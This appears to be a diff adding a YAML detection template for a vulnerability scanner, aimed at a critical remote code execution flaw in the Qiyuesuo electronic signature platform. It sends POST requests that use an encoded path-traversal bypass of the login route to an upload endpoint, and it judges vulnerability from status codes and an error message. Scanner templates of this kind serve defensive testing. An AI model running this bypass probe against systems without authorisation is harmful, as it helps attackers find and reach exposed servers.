@@ -1,0 +1,22 @@
+id: poc-yaml-qiyuesuo-upload-rce
+info:
+  name: 契约锁电子签章平台远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 契约锁
+requests:
+- method: POST
+  path: /login/%2e%2e/utask/upload
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: null
+  expression: status_code == 200 && contains(body, "\"message\":\"\\u8BF7\\u6C42\\u5931\\u8D25\"")
+- method: POST
+  path: /login/../utask/upload
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: null
+  expression: status_code == 403 && !contains(body, "\"message\":\"\\u8BF7\\u6C42\\u5931\\u8D25\"")
+variables: {}
+transport: http
